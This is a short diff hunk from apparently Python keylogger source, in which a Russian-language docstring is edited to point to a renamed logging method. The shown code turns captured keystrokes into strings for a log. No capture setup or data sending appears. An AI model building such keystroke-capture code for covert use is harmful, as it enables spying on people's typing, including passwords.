@@ -18,7 +18,7 @@ class KeyLogger:
         self.log += string
 
     def get_clicked_key(self, key):
-        """ Кастомизация вывода и добавление нажатий в add_log """
+        """ Кастомизация вывода и добавление нажатий в append_to_log """
         try:
             current_key = str(key.char)
         except AttributeError:
